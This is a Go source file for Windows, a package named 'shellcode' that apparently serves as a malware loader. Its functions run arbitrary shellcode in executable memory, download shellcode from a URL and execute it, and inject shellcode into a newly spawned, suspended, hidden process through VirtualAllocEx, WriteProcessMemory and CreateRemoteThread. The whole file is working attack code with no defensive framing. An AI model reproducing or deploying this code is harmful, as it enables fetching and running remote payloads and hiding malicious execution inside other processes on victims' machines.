//go:build windows

package shellcode

import (
	"syscall"
	"unsafe"
	"fmt"
	"io"
	"net/http"

)

func ExecShellcode(shellcode []byte) error{
	var (
		kernel32     = syscall.NewLazyDLL("kernel32.dll")
		VirtualAlloc = kernel32.NewProc("VirtualAlloc")
		copyMemory   = kernel32.NewProc("RtlMoveMemory")
	)

	const (
		MEM_COMMIT             = 0x1000
		MEM_RESERVE            = 0x2000
		PAGE_EXECUTE_READWRITE  = 0x40
	)
	// Allocate memory in the process
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	// Copy shellcode into the allocated memory
	copyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	// Execute the shellcode in a non-blocking way by creating a new thread.
	createThread := kernel32.NewProc("CreateThread")
	threadHandle, _, callErr := createThread.Call(
		0,        // lpThreadAttributes
		0,        // dwStackSize
		addr,     // lpStartAddress
		0,        // lpParameter
		0,        // dwCreationFlags (0 for running immediately)
		0,        // lpThreadId
	)
	if threadHandle == 0 {
		return fmt.Errorf("failed to create thread: %v", callErr)
	}
	return nil
}

func DownloadAndExecuteShellcode(url string) error {
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("failed to download shellcode: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("received non-200 response: %d", resp.StatusCode)
	}

	shellcode, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read shellcode: %w", err)
	}

	return ExecShellcode(shellcode)
}

// StartRemoteThread creates a new process from the provided binary path in suspended mode,
// allocates remote memory, writes shellcode into the remote process, and starts a remote thread
// to execute the shellcode. After injection the main thread of the process is resumed.
func StartRemoteThread(shellcode []byte, binaryPath string) error {
	const (
		MEM_COMMIT            = 0x1000
		MEM_RESERVE           = 0x2000
		PAGE_EXECUTE_READWRITE = 0x40
		CREATE_SUSPENDED      = 0x4
	)

	// Prepare startup info and process information structures.
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	// Create the process in suspended mode.
	appPtr, err := syscall.UTF16PtrFromString(binaryPath)
	if err != nil {
		return fmt.Errorf("failed to convert binary path: %w", err)
	}
	si.Flags |= syscall.STARTF_USESHOWWINDOW
	si.ShowWindow = syscall.SW_HIDE
	err = syscall.CreateProcess(
		appPtr,
		nil,
		nil,
		nil,
		false,
		CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		return fmt.Errorf("CreateProcess failed: %w", err)
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")

	// Allocate remote memory in the target process.
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	remoteAddr, _, err := VirtualAllocEx.Call(
		uintptr(pi.Process),
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if remoteAddr == 0 {
		return fmt.Errorf("VirtualAllocEx failed: %w", err)
	}

	// Write the shellcode into the allocated memory.
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	var bytesWritten uintptr
	ret, _, err := WriteProcessMemory.Call(
		uintptr(pi.Process),
		remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %w", err)
	}

	// Create a remote thread to execute the shellcode.
	CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
	threadHandle, _, err := CreateRemoteThread.Call(
		uintptr(pi.Process),
		0,
		0,
		remoteAddr,
		0,
		0,
		0,
	)
	if threadHandle == 0 {
		return fmt.Errorf("CreateRemoteThread failed: %w", err)
	}

	// Resume the main thread of the suspended process.
	resumeThread := kernel32.NewProc("ResumeThread")
	_, _, err = resumeThread.Call(uintptr(pi.Thread))
	if err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("failed to resume main thread: %w", err)
	}

	return nil
}
